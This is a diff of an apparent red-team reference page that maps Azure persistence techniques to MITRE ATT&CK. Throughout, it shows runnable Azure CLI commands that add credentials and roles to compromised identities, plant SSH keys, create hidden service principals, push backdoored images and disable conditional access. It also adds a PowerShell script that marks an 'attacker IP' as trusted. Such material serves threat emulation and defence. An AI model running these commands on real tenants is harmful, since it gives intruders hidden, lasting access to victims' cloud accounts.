@@ -4,11 +4,14 @@ hniques to maintain continuous access across reboots, credential rotations, and 
 
 ***
 
-#### 👤 Account Manipulation → **T1098 – Account Manipulation**
+#### Account Manipulation **T1098**&#x20;
 
-***
+Account Manipulation refers to adversaries creating, modifying, or disabling accounts to maintain access, escalate privileges, or disrupt operations.\
+Rather than relying solely on stolen credentials, attackers alter identity infrastructure to solidify their control — for example, by adding users to privileged groups, resetting passwords, creating new service accounts, or modifying permissions.
 
-**➡️ T1098.001 – Additional Cloud Credentials**
+These actions allow adversaries to blend in with normal user behavior, evade detection, and establish long-term persistence inside compromised systems or cloud environments.
+
+**Additional Cloud Credentials T1098.001**&#x20;
 
 **Description**:\
 Add new authentication credentials (e.g., client secrets, certificates) to Azure Service Principals or Managed Identities to maintain access even after rotation.
@@ -16,15 +19,10 @@ Add new authentication credentials (e.g., client secrets, certificates) to Azure
 **Azure Example**:
 
 ```bash
-bashCopyEditaz ad sp credential reset --name <service-principal-id> --append --password <new-password>
+az ad sp credential reset --name <service-principal-id> --append --password <new-password>
 ```
 
-✅ **Mapping**:\
-**MITRE ID**: T1098.001 – _Account Manipulation: Additional Cloud Credentials_
-
-***
-
-**➡️ T1098.003 – Additional Cloud Roles**
+**Additional Cloud Roles T1098.003**
 
 **Description**:\
 Assign new or elevated Azure RBAC roles to existing compromised identities to maintain privileged access.
@@ -32,15 +30,10 @@ Assign new or elevated Azure RBAC roles to existing compromised identities to ma
 **Azure Example**:
 
 ```bash
-bashCopyEditaz role assignment create --assignee <spn-id> --role Contributor --scope /subscriptions/<sub-id>
+az role assignment create --assignee <spn-id> --role Contributor --scope /subscriptions/<sub-id>
 ```
 
-✅ **Mapping**:\
-**MITRE ID**: T1098.003 – _Account Manipulation: Additional Cloud Roles_
-
-***
-
-**➡️ T1098.004 – SSH Authorized Keys**
+**SSH Authorized Keys T1098.004**&#x20;
 
 **Description**:\
 Plant SSH keys into Azure VMs to maintain persistent remote access.
@@ -48,37 +41,35 @@ Plant SSH keys into Azure VMs to maintain persistent remote access.
 **Azure Example**:
 
 ```bash
-bashCopyEditaz vm extension set --publisher Microsoft.OSTCExtensions --name VMAccessForLinux --vm-name victim-vm --resource-group victim-rg --protected-settings '{"username":"azureuser","ssh_key":"ssh-rsa AAAAB3..."}'
+az vm extension set --publisher Microsoft.OSTCExtensions --name VMAccessForLinux --vm-name victim-vm --resource-group victim-rg --protected-settings '{"username":"azureuser","ssh_key":"ssh-rsa AAAAB3..."}'
 ```
 
-✅ **Mapping**:\
-**MITRE ID**: T1098.004 – _Account Manipulation: SSH Authorized Keys_
+#### **Create Account T1136**&#x20;
 
-***
+Create Account refers to adversaries creating new user accounts to establish persistent access to a system.\
+By setting up their own accounts — often disguised as legitimate users or service accounts — attackers blend into the environment and maintain control even if other access paths are discovered and shut down.
 
-#### 🛠️ Create Account → **T1136 – Create Account**
+In containerized and cloud-native infrastructures, this includes:
 
-***
+* Creating new Kubernetes service accounts with specific permissions
+* Adding Linux users on container hosts or Kubernetes nodes
+* Registering new cloud identities (IAM users, service principals, managed identities) with malicious intent
+* Injecting accounts inside images during build or runtime
 
-**➡️ T1136.003 – Cloud Account**
+These accounts allow attackers to authenticate legitimately using trusted mechanisms, bypassing many detection controls.
+
+**Cloud Account T1136.003**&#x20;
 
 **Description**:\
-Create hidden Azure AD users, service principals, or guest accounts for ongoing access.
+Create hidden Azure Entra ID users, service principals, or guest accounts for ongoing access.
 
 **Azure Example**:
 
 ```bash
-bashCopyEditaz ad sp create-for-rbac --name hidden-spn --role Reader --scopes /subscriptions/<sub-id>
+az ad sp create-for-rbac --name hidden-spn --role Reader --scopes /subscriptions/<sub-id>
 ```
 
-✅ **Mapping**:\
-**MITRE ID**: T1136.003 – _Create Account: Cloud Account_
-
-***
-
-#### 📅 Event Triggered Execution → **T1546 – Event Triggered Execution**
-
-***
+#### 📅 Event Triggered Execution (**T1546)**
 
 **Description**:\
 Use Azure Event Grid, Logic Apps, or Functions to automatically trigger attacker-controlled operations.
@@ -86,18 +77,29 @@ Use Azure Event Grid, Logic Apps, or Functions to automatically trigger attacker
 **Azure Example**:
 
 ```bash
-bashCopyEditaz logic workflow create --resource-group victim-rg --name evil-logicapp --definition @evilworkflow.json
+az logic workflow create --resource-group victim-rg --name evil-logicapp --definition @evilworkflow.json
 ```
 
-✅ **Mapping**:\
-**MITRE ID**: T1546 – _Event Triggered Execution_\
-(_no subtechnique yet defined specifically for Azure Event Triggers, but still covered under general T1546_)
-
 ***
 
-#### 🧬 Implant Internal Image → **T1587.006 – Develop Capabilities: Implant Internal Image**
+#### Develop Capabilities T1587
 
-***
+**Description**
+
+Develop Capabilities refers to adversaries creating custom tools, malware, or infrastructure designed specifically to target Azure cloud environments.\
+Instead of relying solely on publicly available tools, attackers build specialized capabilities tailored to Azure’s unique systems and defenses.
+
+In Azure environments, this often includes:
+
+* Crafting custom Azure Resource Manager (ARM) scripts for automated exploitation, persistence, or resource deployment
+* Building malicious Azure Functions or Logic Apps to trigger unauthorized execution
+* Developing tools to harvest Azure Entra ID (Azure AD) credentials, service principal secrets, or access tokens
+* Engineering payloads that abuse Azure-specific APIs (e.g., Key Vault access, Storage Account manipulation, Azure SQL attacks)
+* Creating malware that impersonates legitimate Azure services (e.g., fake Azure sign-in pages, trojanized Azure CLI binaries)
+
+The goal is to tailor attack tools that blend seamlessly with Azure operations, evade security controls, and maximize impact against cloud-native infrastructure.
+
+#### 🧬 Implant Internal Image T1587.006
 
 **Description**:\
 Push backdoored containers into Azure Container Registry or AKS clusters to persist access.
@@ -105,19 +107,25 @@ Push backdoored containers into Azure Container Registry or AKS clusters to pers
 **Azure Example**:
 
 ```bash
-bashCopyEditdocker push victimacr.azurecr.io/malicious-backdoor:latest
+docker push victimacr.azurecr.io/malicious-backdoor:latest
 ```
 
-✅ **Mapping**:\
-**MITRE ID**: T1587.006 – _Develop Capabilities: Implant Internal Image_
+#### Modify Authentication Process&#x20;
 
-***
+Modify Authentication Process refers to adversaries tampering with authentication mechanisms to weaken, bypass, or completely control access controls within a system.\
+Instead of stealing credentials directly, attackers alter how authentication happens, making it easier to maintain unauthorized access or disable security policies.
 
-#### 🛡️ Modify Authentication Process → **T1556 – Modify Authentication Process**
+In Azure and containerized environments, this can include:
 
-***
+* Weakening Multi-Factor Authentication (MFA) (e.g., disabling it or forcing re-registration)
+* Modifying Identity Federation or Conditional Access Policies to create backdoors or reduce security
+* Hijacking or altering authentication tokens used by applications, services, or users
+* Replacing or tampering with Identity Providers (IdP) configurations to route authentication through attacker-controlled systems
+* Downgrading authentication methods (e.g., forcing fallback to password-only authentication)
 
-**➡️ T1556.006 – Multi-Factor Authentication**
+By controlling authentication flows, adversaries can persist across reboots, evade security monitoring, and silently escalate privileges.
+
+**Multi-Factor Authentication T1556.006**&#x20;
 
 **Description**:\
 Disable, weaken, or bypass MFA enforcement in Azure AD.
@@ -125,39 +133,69 @@ Disable, weaken, or bypass MFA enforcement in Azure AD.
 **Azure Example**:
 
 ```bash
-bashCopyEditaz ad conditional-access policy update --id <policy-id> --state disabled
+az ad conditional-access policy update --id <policy-id> --state disabled
 ```
 
-✅ **Mapping**:\
-**MITRE ID**: T1556.006 – _Modify Authentication Process: Multi-Factor Authentication_
-
-***
-
-**➡️ T1556.007 – Hybrid Identity**
+**Hybrid Identity T1556.007**
 
 **Description**:\
-Abuse Azure AD Connect to sync rogue accounts across on-premises and cloud.
+Abuse Azure Entra IDConnect to sync rogue accounts across on-premises and cloud.
 
-**Azure Example**:
-
-✅ **Mapping**:\
-**MITRE ID**: T1556.007 – _Modify Authentication Process: Hybrid Identity_
-
-***
-
-**➡️ T1556.008 – Conditional Access Policies**
+**Conditional Access Policies T1556.008**
 
 **Description**:\
 Alter Azure Conditional Access (CA) policies to create easier access paths.
 
 **Azure Example**:
 
-```bash
-bashCopyEditaz ad conditional-access policy update --id <policy-id> --conditions '{"locations":["trusted-location-id"]}'
-```
+{% hint style="info" %}
+Script utilized to update trusted locations to simulate technique
+{% endhint %}
 
-✅ **Mapping**:\
-**MITRE ID**: T1556.008 – _Modify Authentication Process: Conditional Access Policies_
+```bash
+# Get all named locations
+$locations = Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/namedLocations"
+
+# Display all locations with their IDs for your reference
+$locations.value | ForEach-Object {
+    Write-Host "Location: $($_.displayName), ID: $($_.id)"
+}
+
+# Ask for input to select which location to update
+$locationId = Read-Host "Copy and paste the ID of the location you want to update"
+
+# Only proceed if an ID was provided
+if ($locationId) {
+    # Create update parameters
+    $params = @{
+        "@odata.type" = "#microsoft.graph.ipNamedLocation"
+        displayName = "Updated Trusted Location"
+        ipRanges = @(
+            @{
+                "@odata.type" = "#microsoft.graph.iPv4CidrRange"
+                cidrAddress = "192.168.1.0/24"
+            },
+            @{
+                "@odata.type" = "#microsoft.graph.iPv4CidrRange"
+                cidrAddress = "10.0.0.0/24"
+            },
+            @{
+                "@odata.type" = "#microsoft.graph.iPv4CidrRange"
+                cidrAddress = "1.3.3.7/32"  # Attacker IP
+            }
+        )
+        isTrusted = $true
+    }
+    
+    # Update using the API directly to avoid property name confusion
+    $updateUri = "https://graph.microsoft.com/v1.0/identity/conditionalAccess/namedLocations/$locationId"
+    $response = Invoke-MgGraphRequest -Method PATCH -Uri $updateUri -Body ($params | ConvertTo-Json -Depth 10)
+    
+    Write-Host "Location updated successfully!"
+} else {
+    Write-Host "No ID provided. Update canceled."
+}
+```
 
 ***
 
